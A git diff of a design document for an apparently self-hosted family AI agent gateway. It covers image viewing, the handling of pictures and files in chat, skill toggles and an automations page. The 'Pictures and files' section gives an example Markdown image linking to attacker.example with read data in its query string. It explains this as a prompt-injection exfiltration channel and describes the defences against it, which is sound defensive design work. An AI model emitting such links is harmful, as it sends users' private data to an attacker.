@@ -7,21 +7,22 @@ folder, skills and memory. The agent has one tool of its own, `run_command`, plu
 
 ## Decisions
 
-| Area             | Decision                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
-| ---------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Execution        | Commands run as the gateway's macOS user with full access to the disk and no approval step. There is no sandbox. The profile folder is only the default working folder. A "smart mode" that auto-approves or rejects commands may come later.                                                                                                                                                                                                                 |
-| Clients          | Family members use the web UI only. The CLI is for the owner and for the agent itself (skill templates, self-configuration).                                                                                                                                                                                                                                                                                                                                  |
-| Exposure         | Public through a tunnel on a VPS. Every route requires login. The sign-up endpoint is disabled: accounts are created only with the local CLI, and passwords must be long and strong.                                                                                                                                                                                                                                                                          |
-| Profiles         | Any user can create a profile. Any member can add or remove members, rename the profile, or delete it. Deleting moves the folder to `~/.btw-agent/trash/` instead of erasing it.                                                                                                                                                                                                                                                                              |
-| Conversations    | Shared by every member of the profile. Messages go through a queue, and a message sent while the agent is working is fed into its next step (steering). Anyone can press Stop.                                                                                                                                                                                                                                                                                |
-| Sender identity  | Every human message is sent to the model as `Name: text`, with nothing else added. Display names are unique across the gateway.                                                                                                                                                                                                                                                                                                                               |
-| Providers        | Anthropic only for now (API key). Model presets are global and managed by the admin with the CLI or the `/admin` page. A preset has a name (default `<model> (anthropic)`), a model, and an optional context-window override. One preset is the default (the oldest until an admin picks another): new chats start with it, and automations without a preset use it.                                                                                          |
-| Preset switching | Not allowed. A conversation keeps its provider and model for its whole life.                                                                                                                                                                                                                                                                                                                                                                                  |
-| Reasoning        | Chosen per conversation (`low` / `medium` / `high` / `xhigh` / `max`, default `medium`). It can be changed later, but on Claude that rebuilds the conversation's cache once.                                                                                                                                                                                                                                                                                  |
-| System prompt    | Built once when the conversation is created: instructions and the skills catalog. **It is never changed afterwards, and no update notices are added.** If skills change in another conversation, this conversation only sees it by running commands. Memory isn't in it, so every conversation of a profile starts with the same prompt until its skills change.                                                                                              |
-| Memory           | Anthropic's memory tool: a folder of small Markdown files per profile, one per topic, read on demand instead of pasted into the prompt. The family sees and edits it on the Memory page. See [Memory](#memory).                                                                                                                                                                                                                                               |
-| Skills           | Follow [agentskills.io](https://agentskills.io/client-implementation/adding-skills-support). They are read from `~/.btw-agent/profiles/<slug>/skills`, `~/.agents/skills` and the skills that ship with btw (`packages/core/skills`, e.g. `automations`); a profile skill overrides a global one, and both override a built-in one with the same name. The agent loads a skill by running `cat` on its `SKILL.md`, and creates new ones with `btw skill new`. |
-| Web search       | Handled by a skill that uses the firecrawl CLI. The gateway has no code for it.                                                                                                                                                                                                                                                                                                                                                                               |
+| Area               | Decision                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
+| ------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Execution          | Commands run as the gateway's macOS user with full access to the disk and no approval step. There is no sandbox. The profile folder is only the default working folder. A "smart mode" that auto-approves or rejects commands may come later.                                                                                                                                                                                                                              |
+| Clients            | Family members use the web UI only. The CLI is for the owner and for the agent itself (skill templates, self-configuration).                                                                                                                                                                                                                                                                                                                                               |
+| Exposure           | Public through a tunnel on a VPS. Every route requires login. The sign-up endpoint is disabled: accounts are created only with the local CLI, and passwords must be long and strong.                                                                                                                                                                                                                                                                                       |
+| Profiles           | Any user can create a profile. Any member can add or remove members, rename the profile, or delete it. Deleting moves the folder to `~/.btw-agent/trash/` instead of erasing it.                                                                                                                                                                                                                                                                                           |
+| Conversations      | Shared by every member of the profile. Messages go through a queue, and a message sent while the agent is working is fed into its next step (steering). Anyone can press Stop.                                                                                                                                                                                                                                                                                             |
+| Sender identity    | Every human message is sent to the model as `Name: text`, with nothing else added. Display names are unique across the gateway.                                                                                                                                                                                                                                                                                                                                            |
+| Providers          | Anthropic only for now (API key). Model presets are global and managed by the admin with the CLI or the `/admin` page. A preset has a name (default `<model> (anthropic)`), a model, and an optional context-window override. One preset is the default (the oldest until an admin picks another): new chats start with it, and automations without a preset use it.                                                                                                       |
+| Preset switching   | Not allowed. A conversation keeps its provider and model for its whole life.                                                                                                                                                                                                                                                                                                                                                                                               |
+| Reasoning          | Chosen per conversation (`low` / `medium` / `high` / `xhigh` / `max`, default `medium`). It can be changed later, but on Claude that rebuilds the conversation's cache once.                                                                                                                                                                                                                                                                                               |
+| System prompt      | Built once when the conversation is created: instructions and the skills catalog. **It is never changed afterwards, and no update notices are added.** If skills change in another conversation, this conversation only sees it by running commands. Memory isn't in it, so every conversation of a profile starts with the same prompt until its skills change.                                                                                                           |
+| Memory             | Anthropic's memory tool: a folder of small Markdown files per profile, one per topic, read on demand instead of pasted into the prompt. The family sees and edits it on the Memory page. See [Memory](#memory).                                                                                                                                                                                                                                                            |
+| Skills             | Follow [agentskills.io](https://agentskills.io/client-implementation/adding-skills-support). They are read from `~/.btw-agent/profiles/<slug>/skills`, `~/.agents/skills` and the skills that ship with btw (`packages/core/skills`: `automations` and `view-images`); a profile skill overrides a global one, and both override a built-in one with the same name. The agent loads a skill by running `cat` on its `SKILL.md`, and creates new ones with `btw skill new`. |
+| Pictures and files | The agent writes Markdown: `![alt](path or URL)` shows a picture, `[label](path)` hands over a file. The gateway copies each one, byte for byte, when the reply is saved, and the chat only ever loads those copies. Web pictures only from links the agent found, never from the local network. The agent looks at pictures itself with `btw view`, which attaches them to that command's result. There is no tool for either.                                            |
+| Web search         | Handled by a skill that uses the firecrawl CLI. The gateway has no code for it.                                                                                                                                                                                                                                                                                                                                                                                            |
 
 ## Files on disk
 
@@ -29,7 +30,8 @@ folder, skills and memory. The agent has one tool of its own, `run_command`, plu
 ~/.btw-agent/                 (override with BTW_HOME)
   config.json                 auth secret, Anthropic key, extra env vars for commands (mode 600)
   btw.db                      SQLite: users, sessions, profiles, presets, conversations, messages,
-                              triggers, trigger runs, notifications
+                              media, triggers, trigger runs, notifications
+  media/<sha256>              copies of the pictures and files shown in chats
   bin/btw                     shim so the agent can run `btw` from any command
   profiles/<slug>/            default working folder for commands in this profile
     memories/<topic>.md       long-term memory: what the memory tool calls /memories
@@ -41,6 +43,11 @@ folder, skills and memory. The agent has one tool of its own, `run_command`, plu
 
 The folder name is a slug that is fixed when the profile is created. Renaming a profile changes
 only its display name, so the skill paths already in system prompts stay valid.
+
+Every skill is on in every profile until someone turns it off, on the profile's Skills page or with
+`btw skill disable`. The profile stores the names it turned off (`profile.disabled_skills`), so skills
+added later start out on. Skills that are off are left out of the catalog when a conversation is
+created; conversations already running keep the catalog they started with.
 
 ## Prompt caching
 
@@ -105,12 +112,43 @@ kick(conversation):                     one loop per conversation at a time
   Background processes that a command detaches keep running.
 - No stdin. `TERM=dumb`, `NO_COLOR=1`, `PAGER=cat`.
 - Output is stdout and stderr interleaved, with ANSI codes removed, capped at 30 KB (the first 10 KB and
-  the last 20 KB are kept), followed by an exit-code line.
+  the last 20 KB are kept), followed by an exit-code line. Images the command showed with `btw view`
+  follow as image blocks (below).
 - The environment is the gateway's own, minus its secrets (`ANTHROPIC_API_KEY`, `BETTER_AUTH_SECRET`, …),
   plus the `commandEnv` values from `config.json` (for example `FIRECRAWL_API_KEY`), plus
-  `BTW_PROFILE`, `BTW_PROFILE_DIR` and `BTW_CONVERSATION_ID`.
+  `BTW_PROFILE`, `BTW_PROFILE_DIR`, `BTW_CONVERSATION_ID` and `BTW_VIEW_DIR`.
 - `eager_input_streaming` is left off: the input is one short command, and leaving it off keeps the API's
   own input validation.
+
+### Seeing images: `btw view`
+
+The agent looks at an image by running `btw view <file>...`. It adds no tool of its own: the images are
+attached to that `run_command` call's `tool_result`, which may hold image blocks, so the tool
+definition and every conversation's cache stay as they are. Like automations, nothing is added to
+the system prompt beyond the skills catalog: the built-in `view-images` skill explains `btw view`,
+and how to see what isn't a picture file yet (the screen, PDF pages, video frames, web pages),
+crops for small print and contact sheets for many photos. A profile that turns the skill off
+doesn't learn about `btw view`. Showing pictures to people is the other direction, in
+[Pictures and files](#pictures-and-files).
+
+- **Handoff.** Every call gets a fresh temp folder (`BTW_VIEW_DIR`) holding the conversation's
+  remaining image allowance. `btw view` prepares each image, writes it there and adds a line to a
+  manifest. After the command exits the gateway checks the files again, attaches them after the text
+  output (each after an `Image: <path>` line), and deletes the folder. Not markers in stdout: output is
+  cut at 30 KB, and `cat`-ing a file that contains one would attach an image nobody asked for.
+- **Preparing** (`packages/core/src/images.ts`). JPEG, PNG, GIF and WebP up to 2000 px and 1.5 MB are
+  sent as they are; JPEGs lose their EXIF and XMP segments (GPS positions, and an orientation that
+  browsers apply but the model ignores). Everything else is converted with `sips` on macOS or
+  ImageMagick elsewhere: at most 2000 px, turned upright, PNG when the source was PNG, GIF or WebP
+  unless that's over 1.5 MB, otherwise JPEG. PDFs are refused.
+- **Why 2000 px**, although newer models take 2576: a request with more than 20 images, the history
+  included, rejects any image over 2000 px. History is never edited, so a larger image would break
+  the conversation for good once it holds 21.
+- **Limits.** 10 images per command. Per conversation 100 images and 20 MB of base64, because every
+  request resends the whole history and is capped at 32 MB (and at 100 images on 200k-context
+  models). Past a limit `btw view` fails with an explanation; nothing is dropped silently.
+- Images are stored as base64 in the `tool_results` row like any other content and replayed
+  byte-for-byte, so after the first call they're read from the cache.
 
 ## Memory
 
@@ -166,6 +204,15 @@ into conversations.
   in the system prompt beyond the skills catalog: the built-in `automations` skill explains
   `btw trigger` and `btw wake`, and is read only when someone asks for a reminder or a check. Members
   see, edit, run, pause and delete them on the profile's Automations page. There is no create form.
+- **The Automations page** is for the family, not the agent. Each trigger shows its `icon` and a
+  one-sentence `summary` (written by the agent with `--summary` / `--icon`, like `run_command`'s),
+  its schedule in plain words (`describeCron`: "Every weekday at 07:30"; the cron itself only with
+  technical details on) and relative times ("next Monday at 07:30"). The prompt, script and webhook
+  URL are behind Edit. Above the list, a month calendar (whole weeks, Monday first, `?month=`
+  to page) shows an icon per trigger on each day and the chosen day's list below it: before now,
+  what ran and how it went (agent runs, and failed scripts once a day; runs are kept 30 days, so
+  it goes back no further), after now, what the schedule will run. A trigger firing more than 4
+  times a day on average is listed once above the grid instead.
 - **Runs.** Every firing (schedule, webhook, `btw wake`, Run now) inserts a `pending` row in
   `trigger_run`. The gateway's scheduler ticks every 5 s: it fires triggers whose `nextRunAt` has
   passed and starts pending runs. The CLI only writes rows, so `btw wake` from a script is picked up
@@ -194,6 +241,68 @@ into conversations.
   usual "restarted" result) and script runs in progress are marked failed.
 - **Retention:** finished runs, notifications and hidden conversations are deleted after 30 days, and
   only the last 100 runs of each trigger are kept.
+
+## Pictures and files
+
+The agent shows a picture by writing a Markdown image, `![what it shows](path)`, and hands over a
+file by linking it, `[Tax form](path)`. The system prompt explains this (so only conversations
+created since know it). There is no new tool and the reply's `content` is never touched, so the
+cached prefix doesn't change.
+
+- **What counts** (`@btw/core/media-refs`): images whose target is a path on the computer (absolute,
+  `~/…`, relative to the profile folder, or `file://`) or an http(s) URL, and links whose target is
+  a path. Links to web pages stay links. It reads the text with marked's lexer, so code spans and
+  code blocks are skipped, and the browser renders with the same file, so both agree.
+- **Copied when the reply is saved.** After a model call, before appending its row, the runner copies
+  every target into `~/.btw-agent/media/<sha256>` in its original size and bytes (remote pictures are
+  downloaded, with a 30 s timeout), then appends the row and one `media` row per target in the same
+  transaction. The chat keeps showing a picture after the original is moved, edited or was a
+  temporary file, and background runs nobody opens for days keep theirs. The streamed reply stays
+  on screen meanwhile; Stop aborts the copying.
+- **Web pictures only from links the agent found.** The gateway downloads them itself, so without
+  a rule a reply containing `![x](https://attacker.example/p.png?d=<something the agent read>)`
+  would hand that data to the attacker as soon as it's saved, and a prompt injection would only
+  have to get the model to write a picture, a lower bar than getting it to run `curl`. So a web
+  picture is downloaded only if its exact link appears earlier in the conversation, in what a
+  person wrote, an automation's prompt or event, or a command's output: the agent found the link
+  rather than built it (the rule of Anthropic's web fetch tool). The agent's own replies and
+  commands don't count; the match must be the whole link, not the start of a longer one; `&amp;`
+  and `\/` read as `&` and `/`, so links copied out of HTML and JSON match. Otherwise the row says
+  "Web pictures are shown only when btw found the link on a page or in a message", and the system
+  prompt tells the agent to download other pictures and show the file. This narrows the channel
+  rather than closing it: a reply can still choose which of the links it found to show, and a
+  command can print any link, but an agent that runs commands can already send anything with
+  `curl`.
+- **Never from this computer or the local network.** Downloads use Node's `http`/`https` with a
+  DNS lookup that refuses loopback, private, shared (CGNAT, Tailscale), link-local, multicast and
+  reserved addresses, and this computer's own addresses. Node calls it for each connection, so the
+  address checked is the one connected to (a name can't resolve to a public address for the check
+  and a local one for the connection). IP addresses in a link are checked before connecting, and
+  each redirect (up to 5) goes through the same checks.
+- **Limits:** 100 MB per file, 30 per reply. `config.json` and the database are never copied. A
+  target that can't be copied gets a row with the reason in plain words (not found, a folder, too
+  large, not a picture, a web link the agent didn't find, a local-network address, the download
+  failed), which the chat shows in its place.
+- **Types come from the content.** A picture is never recognized by its extension. HEIC and TIFF
+  (and camera RAW files) also get a full-size JPEG copy for display, made with macOS's `sips`; the
+  download is still the original. Elsewhere they are shown as downloads. Width and height (with
+  EXIF rotation applied) are read from the file header, so the chat reserves the space before a
+  picture loads and stays scrolled to the bottom.
+- **Serving:** `GET /api/c/<conversation>/media/<id>` checks that the user belongs to the
+  conversation's profile and serves the copy by its random id; it never takes a path. Pictures are
+  sent inline and everything else as an attachment; `?download` sends the original. Responses
+  carry `nosniff`, a sandboxing CSP (an SVG opened in its own tab can't run script) and an
+  immutable cache header.
+- **The chat only loads btw's copies.** The Markdown renderer swaps each target for its copy: a
+  picture (click to open a viewer with a Download button), a download card for files and for
+  pictures browsers can't show, or a pulsing placeholder while the reply is still streaming.
+  DOMPurify drops any other `<img>` source, `<style>`, inline styles, `srcset`, audio, video and SVG
+  images, so the browser never loads anything a reply names from another site without a click. The
+  gateway's own downloads are what the two rules above guard.
+- **Cleanup:** `media` rows go with their conversation. The scheduler's hourly prune deletes stored
+  files that no row points to any more and that are over an hour old (so a copy about to be saved
+  is safe). Identical files are stored once.
+- The notification menu shows pictures as `[their description]` and file links as their label.
 
 ## Web UI
 
@@ -230,10 +339,12 @@ composer. Most of the family doesn't read shell, so the default view hides the m
 
 ```
 packages/core   @btw/core. Schema + migrations, config, skills, prompt, run_command, memory tool,
-                Anthropic call, runner, users/profiles/presets, triggers, scheduler, notifications.
-                Built-in skills in packages/core/skills. Plain TypeScript run by Node with type stripping
-                (no enums or parameter properties; imports use .ts extensions).
-packages/cli    btw: setup, start, service, config, key, env, user, preset, profile, skill, trigger, wake
+                btw view images, Anthropic call, runner, media, users/profiles/presets, triggers,
+                scheduler, notifications. Built-in skills in packages/core/skills. Plain TypeScript run
+                by Node with type stripping (no enums or parameter properties; imports use .ts
+                extensions).
+packages/cli    btw: setup, start, service, config, key, env, user, preset, profile, skill, trigger, wake,
+                view
 src/            SvelteKit gateway (adapter-node). @btw/core is bundled into the server build.
                 UI components in src/lib/components (shadcn-svelte primitives in ui/).
 scripts/        build-cli.mjs bundles the CLI and core into dist/cli.js with esbuild.
